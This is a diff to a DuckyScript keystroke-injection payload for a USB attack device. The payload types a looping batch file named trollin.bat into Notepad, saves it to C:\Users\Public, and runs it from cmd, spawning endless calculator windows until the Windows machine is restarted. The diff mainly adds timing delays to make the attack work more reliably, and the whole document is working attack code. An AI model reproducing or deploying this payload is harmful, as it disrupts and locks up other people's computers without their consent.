@@ -1,9 +1,12 @@
 REM Generates a script that spawns infinite calculators and ruins a Microsoft Windows machine until you restart it.
-DEFULT_DELAY 250
+DELAY 500
 GUI
+DELAY 500
 STRING notepad
 ENTER
+DELAY 500
 CTRL n
+DELAY 100
 STRING @echo off
 DELAY 20
 ENTER
@@ -19,15 +22,27 @@ DELAY 20
 STRING goto start
 DELAY 20
 CTRL s
+DELAY 200
 STRING trollin.bat
+DELAY 200
 ALT d
+DELAY 100
 STRING C:\Users\Public
+DELAY 100
 ENTER
+DELAY 100
 ENTER
+DELAY 100
 GUI
+DELAY 100
 STRING cmd
+DELAY 100
 ENTER
+DELAY 100
 STRING cd C:\Users\Public
+DELAY  100
 ENTER
+DELAY 100
 STRING trollin.bat
+DELAY 100
 ENTER
